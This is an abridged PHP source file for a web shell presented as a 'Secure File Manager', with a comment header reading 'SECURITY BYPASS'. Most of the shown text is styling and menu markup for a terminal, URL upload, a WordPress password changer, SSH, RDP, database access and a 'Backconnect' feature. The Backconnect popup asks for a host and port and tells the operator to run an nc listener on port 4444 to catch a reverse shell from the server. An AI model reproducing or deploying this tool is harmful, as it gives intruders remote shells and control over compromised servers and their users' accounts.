<?php
// ==================== SECURITY BYPASS & ERROR HANDLING ====================
...
if (!isset($_SESSION['ok'])) {
    ...
    * { margin: 0; padding: 0; box-sizing: border-box; }
    ...
    echo '<div class="watermark">v3.0 • Secure File Manager</div>
    </div>
    </body>
    </html>';
    exit;
...
<head>
    ...
    * { margin: 0; padding: 0; box-sizing: border-box; }
    ...
    .btn-backconnect {
        background: linear-gradient(90deg, var(--backconnect), #f97316);
        color: white;
    }
    ...
    .main-content {
        ...
        gap: 25px;
        margin-bottom: 100px; /* Space for mobile menu */
    }
    ...
    .bulk-actions-bar {
        ...
        flex-wrap: wrap;
        position: sticky;
        bottom: 100px; /* Above mobile menu */
        z-index: 100;
        backdrop-filter: blur(10px);
    }
    ...
    .feature-section.backconnect-section h4 {
        color: var(--backconnect);
    }
    ...
    .form-btn.backconnect-btn:hover {
    ...
    @media (max-width: 768px) {
        ...
        .bulk-actions-bar {
            bottom: 70px; /* Adjusted for mobile menu height */
            padding: 12px 20px;
        }
        .container {
            padding-bottom: 80px;
    ...
    <div class="header">
        ...
        <div class="controls">
            ...
            <div class="action-buttons desktop-only">
                ...
                <!-- BACKCONNECT BUTTON ADDED -->
                <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1" class="btn btn-backconnect pulse-orange">🔗 Backconnect</a>
        ...
        <div class="file-manager-card">
            ...
            <div class="table-container">
                <form id="bulkForm" method="POST">
                            ...
                            <?php if (count($files) <= 2): ?>
                                <tr>
                                    <td colspan="6" class="empty-state">
                                        ...
                                        <div>Upload files or create new ones</div>
                                    </td>
                                </tr>
                            <?php else: ?>
                                        ...
                                        <td>
                                            <div style="display: flex; align-items: center;">
                                                ...
                                                <div style="min-width: 0;">
                                                    <div style="font-weight: 600; word-break: break-all;"><?=esc($f)?></div>
                    ...
                    <!-- Bulk Actions Bar - POSITION FIXED -->
...
<!-- Mobile Menu - IMPROVED WITH TEXT -->
<div class="mobile-menu">
    <a href="?dir=<?=urlencode($dir)?>&show_monitor=1" class="btn btn-secondary">📊 Mon</a>
    <a href="?dir=<?=urlencode($dir)?>&show_terminal=1" class="btn btn-secondary">💻 Term</a>
    <a href="?dir=<?=urlencode($dir)?>&show_bulk=1" class="btn btn-secondary">🔧 Bulk</a>
    <a href="?dir=<?=urlencode($dir)?>&show_upload=1" class="btn btn-secondary">📤 Up</a>
    <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1" class="btn btn-primary">🔗 URL</a>
    <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1" class="btn btn-primary">🔑 WP</a>
    <a href="?dir=<?=urlencode($dir)?>&show_ssh=1" class="btn btn-primary">🔐 SSH</a>
    <a href="?dir=<?=urlencode($dir)?>&show_rdp=1" class="btn btn-primary">🖥️ RDP</a>
    <a href="?dir=<?=urlencode($dir)?>&show_database=1" class="btn btn-primary">🗄️ DB</a>
    <!-- BACKCONNECT MOBILE WITH TEXT -->
    <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1" class="btn btn-backconnect">🔗 Back</a>
    <a href="?logout=1" class="btn btn-danger">🚪 Out</a>
</div>
...
<!-- BACKCONNECT POPUP - NEWLY ADDED -->
<?php if ($show_backconnect): ?>
<div class="popup-overlay">
    <div class="popup-content">
        <div class="popup-header">
            <h3>🔗 Backconnect Manager</h3>
            <button class="popup-close" onclick="window.location.href='?dir=<?=urlencode($dir)?>'">×</button>
        </div>
        <div class="popup-body">
            <form method="POST">
                <div class="feature-section backconnect-section">
                    <h4>🔗 Establish Backconnect</h4>
                    <div class="form-group">
                        <label class="form-label">Target IP/Host</label>
                        <input type="text" name="backconnect_host" class="form-input" placeholder="e.g., 192.168.1.100 or your-domain.com" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Target Port</label>
                        <input type="number" name="backconnect_port" class="form-input" placeholder="e.g., 4444, 5555, 8080" value="4444" required>
                    </div>
                    <button type="submit" class="form-btn backconnect-btn">🔗 Establish Connection</button>
                </div>
            </form>
            ...
            <div class="instruction-box">
                <h4>📖 Quick Guide</h4>
                <p><strong>1. Start listener on YOUR machine:</strong></p>
                <pre># Linux/Mac
nc -lvnp 4444

# Windows (PowerShell)
Test-NetConnection -ComputerName YOUR_IP -Port 4444</pre>
                
                <p><strong>2. Enter your listener IP & port above</strong></p>
                <p><strong>3. Click "Establish Connection"</strong></p>
                
                <p><small>💡 <strong>Note:</strong> Make sure firewall allows connections on the specified port.</small></p>
            </div>
        </div>
    </div>
</div>
...
<div class="popup-overlay" style="align-items: flex-start; padding-top: 40px;">
    <div class="popup-content" style="max-width: 900px; max-height: 90vh;">
        ...
        <div class="popup-body">
            <form method="POST">
                <div class="form-group">
                    <textarea name="edit_content" style="width: 100%; height: 400px; padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: var(--text-primary); font-family: 'Cascadia Code', monospace; font-size: 14px; line-height: 1.6; resize: vertical;"><?=esc($_SESSION['edit']['data'])?></textarea>
                </div>
...
if (window.innerWidth <= 768) {
    ...
    // Adjust bulk actions position for mobile
    const bulkBar = document.getElementById('bulkActionsBar');
    if (bulkBar) {
        bulkBar.style.position = 'sticky';
        bulkBar.style.bottom = '70px';
